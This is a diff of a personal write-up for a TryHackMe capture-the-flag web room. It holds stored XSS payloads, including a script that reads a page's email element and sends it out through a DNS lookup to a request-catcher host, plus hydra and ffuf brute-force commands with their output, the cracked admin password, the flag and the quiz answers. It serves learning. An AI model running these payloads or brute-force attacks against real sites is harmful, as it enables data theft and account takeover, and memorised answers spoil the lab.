@@ -127,3 +127,133 @@ Target: http://10.10.84.149/
 after registering
 XSS
 <div><textarea name="message" class="form-control" style="height: 200px;"></textarea></div>
+
+</textarea><script>alert(1)</script>
+
+http://10.10.10.100/
+
+The TryHackMe request catcher creates a unique URL that you can use on the TryHackMe private network for logging HTTP and DNS requests from your target, perfect for various blind Attacks!
+
+TryHackMe Request Catcher
+Listening for requests for the below domain
+91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech
+As long as the domain ends in 91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech you can catch other domain results for example:
+
+    str91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech
+    str-91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech
+    str.91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech
+    str.str.91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech
+
+</textarea>
+<img src="http://91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech">
+<textarea>
+
+We received a DNS lookup with type: AAAA for the domain:
+91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech
+
+The Lookup was requested @ 28 Jul 2023 14:20:25 UTC from IP 200.48.79.81
+
+We received the following HTTP Request:
+----------------------------------------------------------------------------------
+
+GET / HTTP/1.1
+Host: 91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech
+Referer: http://10.10.84.149/
+Connection: close
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.5
+Accept: image/avif,image/webp,*/*
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+----------------------------------------------------------------------------------
+Request received @ 28 Jul 2023 14:20:25 UTC from IP 10.8.19.103
+
+Exploiting DNS lookups
+
+- We can fetch email from the innerHTML of the `email` DOM element.
+    
+
+- And then append the email as a subdomain. (Classic DNS exfiltration)!
+    
+    - **NOTE:** We need to replace the `@` and `.` characters in the email.
+
+</textarea>
+<script>
+var email = document.getElementById("email").innerHTML;
+email = email.replace('@', 'A');
+email = email.replace('.', 'B');
+fetch('http://'+ email + '.91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech');
+</script>
+<textarea>
+
+We received a DNS lookup with type: A for the domain:
+adminaccountaitsupportbthm.91ee648a9ea9692fd1ff90be789f3e44.log.tryhackme.tech
+
+The Lookup was requested @ 28 Jul 2023 14:29:16 UTC from IP 3.251.105.190
+
+adminaccount@itsupport.thm
+
+Invalid email / password combination
+
+https://www.manrajbansal.com/post/how-to-use-hydra-to-brute-force-login-forms
+
+hydra -l 'adminaccount@itsupport.thm' -P /usr/share/wordlists/rockyou.txt 10.10.84.149 http-post-form "/login:email=^USER^&password=^PASS^&Login=Login:Invalid email / password combination" -V
+
+or
+
+:: Progress: [2036/14344392] :: Job [1/1] :: 161 req/sec :: Duration: [0:00:14] :::: Progress: [2037/14344392] :: Job [1/1] :: 161 req/sec :: Duration: [0:00:14] ::[Status: 401, Size: 1697, Words: 475, Lines: 41, Duration: 271ms]
+    * FUZZ: virgo
+
+:: Progress: [2037/14344392] :: Job [1/1] :: 161 req/sec :: Duration: [0:00:14] ::[Status: 401, Size: 1697, Words: 475, Lines: 41, Duration: 272ms]
+    * FUZZ: loveable
+
+┌──(witty㉿kali)-[~]
+└─$ ffuf -w /usr/share/wordlists/rockyou.txt  -d "email=adminaccount@itsupport.thm&password=FUZZ" -u http://10.10.84.149/login -fw 475 -H "Content-Type: application/x-www-form-urlencoded"
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.0.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://10.10.84.149/login
+ :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Data             : email=adminaccount@itsupport.thm&password=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response words: 475
+________________________________________________
+
+[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 403ms]
+    * FUZZ: 123123
+
+[80][http-post-form] host: 10.10.84.149   login: adminaccount@itsupport.thm   password: 123123
+1 of 1 target successfully completed, 1 valid password found
+
+login
+
+ID 1
+
+Hey, can you change my password to THM{6804f45260135ec8418da2d906328473}
+```
+What is IT Supports email address?
+*adminaccount@itsupport.thm*
+Admin users password
+*123123*
+Flag inside Ticket 1
+
+## Flags / Answers
+- ***THM{6804f45260135ec8418da2d906328473}***
+
+## Notes / Lessons Learned
+[[Busqueda]]
+
